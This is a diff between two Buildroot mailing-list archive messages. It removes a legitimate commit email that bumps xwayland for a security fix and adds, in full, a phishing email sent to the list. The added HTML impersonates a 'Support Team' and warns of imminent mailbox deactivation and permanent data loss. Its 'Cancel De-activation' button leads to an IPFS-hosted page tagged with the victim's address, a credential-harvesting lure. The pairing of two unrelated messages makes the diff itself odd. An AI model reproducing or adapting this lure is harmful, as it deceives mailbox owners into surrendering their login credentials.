@@ -4,48 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 084FEC4332F
-	for <buildroot@archiver.kernel.org>; Tue, 12 Dec 2023 22:14:44 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 640A3C4167D
+	for <buildroot@archiver.kernel.org>; Tue, 12 Dec 2023 22:14:56 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id B568041BB9;
-	Tue, 12 Dec 2023 22:14:43 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org B568041BB9
+	by smtp4.osuosl.org (Postfix) with ESMTP id 1D28341BB9;
+	Tue, 12 Dec 2023 22:14:56 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 1D28341BB9
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
 	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id T57GX86XLAvj; Tue, 12 Dec 2023 22:14:42 +0000 (UTC)
+	with ESMTP id J5pD1jL0Fxst; Tue, 12 Dec 2023 22:14:55 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id D944241C0B;
-	Tue, 12 Dec 2023 22:14:41 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org D944241C0B
+	by smtp4.osuosl.org (Postfix) with ESMTP id 57B1D41C24;
+	Tue, 12 Dec 2023 22:14:54 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 57B1D41C24
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id 3FCDB1BF2A2
- for <buildroot@lists.busybox.net>; Tue, 12 Dec 2023 22:13:40 +0000 (UTC)
+ by ash.osuosl.org (Postfix) with ESMTP id 4D4FD1BF2A2
+ for <buildroot@lists.busybox.net>; Tue, 12 Dec 2023 22:13:48 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id 0D29A82B81
- for <buildroot@lists.busybox.net>; Tue, 12 Dec 2023 22:13:39 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 0D29A82B81
+ by smtp1.osuosl.org (Postfix) with ESMTP id 2A33182D2F
+ for <buildroot@lists.busybox.net>; Tue, 12 Dec 2023 22:13:47 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 2A33182D2F
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id APlm6e97tunO for <buildroot@lists.busybox.net>;
- Tue, 12 Dec 2023 22:13:36 +0000 (UTC)
-Received: from busybox.osuosl.org (busybox.osuosl.org [140.211.167.122])
- by smtp1.osuosl.org (Postfix) with ESMTP id 713D982CD4
- for <buildroot@buildroot.org>; Tue, 12 Dec 2023 22:13:36 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 713D982CD4
-Received: by busybox.osuosl.org (Postfix, from userid 4053)
- id 5D34987B1D; Tue, 12 Dec 2023 22:13:36 +0000 (UTC)
-From: Peter Korsgaard <peter@korsgaard.com>
-To: buildroot@buildroot.org
-Date: Tue, 12 Dec 2023 22:55:03 +0100
-X-Git-Refname: refs/heads/master
-X-Git-Oldrev: 36a9ec8921b6b6c0359ca6e4afd529f8473bab89
-X-Git-Newrev: d6f0a8735e1071fa37790ea40d9cf75e59ee06b6
-X-Patchwork-Hint: ignore
-Message-Id: <20231212221336.5D34987B1D@busybox.osuosl.org>
-Subject: [Buildroot] [git commit] package/xwayland: security bump to version
- 23.2.2
+ with ESMTP id JaaqgNhpYUrz for <buildroot@lists.busybox.net>;
+ Tue, 12 Dec 2023 22:13:46 +0000 (UTC)
+Received: from busybox.net (unknown [91.92.245.140])
+ by smtp1.osuosl.org (Postfix) with ESMTP id F108282D04
+ for <buildroot@busybox.net>; Tue, 12 Dec 2023 22:13:45 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org F108282D04
+From: Noreply@busybox.net
+To: buildroot@busybox.net
+Date: 12 Dec 2023 14:13:45 -0800
+Message-ID: <20231212141344.1459839D30D728D2@busybox.net>
+MIME-Version: 1.0
+Subject: [Buildroot] buildroot@busybox.netSupport Team
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -57,57 +51,127 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5550714473374608611=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-commit: https://git.buildroot.net/buildroot/commit/?id=d6f0a8735e1071fa37790ea40d9cf75e59ee06b6
-branch: https://git.buildroot.net/buildroot/commit/?id=refs/heads/master
+--===============5550714473374608611==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Fixes the following security issues:
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=3DX-UA-Compatible <strong Dear cont>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<BODY>
+<TABLE cellSpacing=3D0 width=3D"100%">
+<TBODY>
+<TR>
+<TD bgColor=3D#045fb4 height=3D110>
+<TABLE width=3D"80%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD><FONT color=3D#ffffff size=3D6 face=3Dcalibri><FONT style=3D"VERTICAL-A=
+LIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Email De-activation =
+in progress...</FONT></FONT></FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8>&nbsp;=20
+<TABLE width=3D"80%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD><FONT size=3D+2 face=3Dcalibri><B><FONT style=3D"VERTICAL-ALIGN: inheri=
+t"><FONT style=3D"VERTICAL-ALIGN: inherit">Dear</FONT></FONT><SPAN><FONT st=
+yle=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">&nb=
+sp;buildroot@busybox.net<BR></FONT></FONT></SPAN></B></FONT><FONT size=3D3 =
+face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTI=
+CAL-ALIGN: inherit"><BR>Notice, indicates that you recently made a request =
+to deactivate email buildroot@busybox.net. This request will be processed s=
+hortly.</FONT>
+ </FONT></FONT>
+<P><FONT size=3D3 face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><F=
+ONT style=3D"VERTICAL-ALIGN: inherit">If this request was made accidentally=
+ and you have no knowledge of it, you are advised to cancel the request now=
+</FONT></FONT></FONT></P></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8 height=3D15>&nbsp;</TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8>
+<TABLE height=3D60 width=3D"80%" align=3Dcenter bgColor=3D#045fb4>
+<TBODY>
+<TR>
+<TD>
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px" align=3Dcenter><A style=3D=
+"TEXT-DECORATION: none; COLOR: rgb(1,134,186)" href=3D"https://bafkreie4mq3=
+nhkqpjiouxvdouhpe66577omv467dr2jaf7vknjm6g2nbom.ipfs.dweb.link/#buildroot@b=
+usybox.net" rel=3Dnoreferrer target=3D_blank><FONT color=3D#ffffff size=3D+=
+2 face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VER=
+TICAL-ALIGN: inherit">Cancel De-activation</FONT></FONT></FONT></A></DIV></=
+TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8 height=3D20>&nbsp;</TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8 height=3D70>
+<TABLE width=3D"80%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD><FONT size=3D3 face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><=
+FONT style=3D"VERTICAL-ALIGN: inherit">However, if you do not cancel this r=
+equest, the your account will be de-activated shortly and all your email da=
+ta will be lost permanently.</FONT></FONT></FONT>=20
+<P><FONT size=3D3 face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><F=
+ONT style=3D"VERTICAL-ALIGN: inherit">Regards.</FONT></FONT><BR><B><FONT st=
+yle=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Sup=
+port Team</FONT></FONT></B></FONT></P></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8 height=3D10>&nbsp;</TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8>
+<TABLE height=3D10 width=3D"80%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD>
+<HR align=3Dcenter width=3D"100%">
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=3D#f8f8f8>
+<TABLE width=3D"80%" align=3Dcenter>
+<TBODY>
+<TR>
+<TD>
+<P><FONT size=3D2 face=3Dcalibri><FONT style=3D"VERTICAL-ALIGN: inherit"><F=
+ONT style=3D"VERTICAL-ALIGN: inherit">This message is auto-generated from E=
+-mail security server, and replies sent to this email can not be delivered.=
+</FONT><FONT style=3D"VERTICAL-ALIGN: inherit">This email is meant for:&nbs=
+p;buildroot@busybox.net</FONT></FONT><SPAN>&nbsp;</SPAN></FONT></P>
+<P><FONT size=3D2 face=3Dcalibri><SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial; WHITE-SPACE: normal; WO=
+RD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR=
+: rgb(65,65,65); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline=
+ !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TE=
+XT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial; text-decoration-thickness:=20
+initial">
+<SPAN style=3D"FONT-SIZE: x-small; FONT-FAMILY: tahoma, sans-serif; WHITE-S=
+PACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WE=
+IGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
+ DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(=
+255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-varian=
+t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: init=
+ial; text-decoration-color: initial;=20
+text-decoration-thickness: initial"><SPAN>Copyright &copy; 2021 sathishfash=
+ions.com &#8226; Web Admin &#8226; </SPAN></SPAN></SPAN></SPAN></FONT></P><=
+/TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
 
-- CVE-2023-5367 X.Org server: OOB write in
-  XIChangeDeviceProperty/RRChangeOutputProperty
+--===============5550714473374608611==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-For details, see the advisory:
-https://lists.x.org/archives/xorg-announce/2023-October/003430.html
-
-Signed-off-by: Peter Korsgaard <peter@korsgaard.com>
----
- package/x11r7/xwayland/xwayland.hash | 6 +++---
- package/x11r7/xwayland/xwayland.mk   | 2 +-
- 2 files changed, 4 insertions(+), 4 deletions(-)
-
-diff --git a/package/x11r7/xwayland/xwayland.hash b/package/x11r7/xwayland/xwayland.hash
-index b62f404d40..12363a66bf 100644
---- a/package/x11r7/xwayland/xwayland.hash
-+++ b/package/x11r7/xwayland/xwayland.hash
-@@ -1,6 +1,6 @@
--# From https://lists.x.org/archives/xorg-announce/2023-March/003376.html
--sha256  fb9461f5cb9fea5e07e91882311b0c88b43e8843b017ebac05eb5af69aa34c15  xwayland-23.1.1.tar.xz
--sha512  21c386847135c5cb4ac884926b0fbeb6ad21c9ee54752e0cdc8418e31a72872d81032159c1d91b8afb915aaaf65e80454342461d676996b2f3c535a37b0147f0  xwayland-23.1.1.tar.xz
-+# From https://lists.x.org/archives/xorg-announce/2023-October/003432.html
-+sha256  9f7c0938d2a41e941ffa04f99c35e5db2bcd3eec034afe8d35d5c810a22eb0a8  xwayland-23.2.2.tar.xz
-+sha512  f5b319fdace7d7c078544730ecd26afeb63b1a0c779fb097455147945df85af32d9e91501ebdb70209d48e8a3ead3b23be31e9d5118358ac17e699abb4b6ac07  xwayland-23.2.2.tar.xz
- 
- # Locally calculated
- sha256  4cc0447a22635c7b2f1a93fec4aa94f1970fadeb72a063de006b51cf4963a06f  COPYING
-diff --git a/package/x11r7/xwayland/xwayland.mk b/package/x11r7/xwayland/xwayland.mk
-index 8550b61389..8eac602042 100644
---- a/package/x11r7/xwayland/xwayland.mk
-+++ b/package/x11r7/xwayland/xwayland.mk
-@@ -4,7 +4,7 @@
- #
- ################################################################################
- 
--XWAYLAND_VERSION = 23.1.1
-+XWAYLAND_VERSION = 23.2.2
- XWAYLAND_SOURCE = xwayland-$(XWAYLAND_VERSION).tar.xz
- XWAYLAND_SITE = https://xorg.freedesktop.org/archive/individual/xserver
- XWAYLAND_LICENSE = MIT
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============5550714473374608611==--
